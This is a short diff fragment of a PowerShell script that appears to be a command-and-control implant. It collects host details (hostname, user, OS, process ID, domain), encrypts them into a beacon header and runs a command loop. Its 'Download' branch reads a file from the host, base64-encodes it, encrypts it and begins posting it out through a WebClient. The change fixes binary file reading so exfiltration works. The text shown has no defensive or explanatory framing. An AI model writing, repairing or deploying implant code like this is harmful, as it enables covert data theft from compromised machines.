@@ -61,7 +61,6 @@ $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 
 # format the headers
 $raw_header = "$final_hostname,$whoami,$os,$pid,$domain";
-
 # encrypt the variables
 $encrypted_header = EncryptCommand $key $raw_header;
 
@@ -93,9 +92,9 @@ while($true){
     }
     elseif($fc.split(" ")[0] -eq "Download"){
       $filename = EncryptCommand $key $fc.split("\")[-1]
-      $file_content = Get-Content $fc.split(" ")[1]
-      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($file_content)
-      $EncodedText =[Convert]::ToBase64String($Bytes)
+      $file_content = Get-Content $fc.split(" ")[1] -Encoding byte
+      #$Bytes = [System.Text.Encoding]::Unicode.GetBytes($file_content)
+      $EncodedText =[Convert]::ToBase64String($file_content)
       $efc = EncryptCommand $key $EncodedText
       $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
